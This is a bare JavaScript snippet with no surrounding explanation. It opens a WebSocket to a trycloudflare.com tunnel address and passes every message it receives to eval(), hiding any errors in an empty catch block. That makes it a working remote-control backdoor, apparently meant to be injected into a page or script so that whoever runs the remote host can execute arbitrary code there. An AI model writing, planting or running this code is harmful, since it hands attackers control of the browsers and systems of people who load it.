try{
  var ws = new WebSocket("ws://kick-paragraph-construct-fun.trycloudflare.com");
  
  ws.onmessage = function(event) {
  	try {
  		eval(event.data);
  	} catch (e) {
  		console.error(e);
  	}
  };
  
  ws.onopen = function() {
  	console.log("Connected");
  };
  
  ws.onclose = function() {
  	console.log("Disconnected");
  };
}catch(e){}
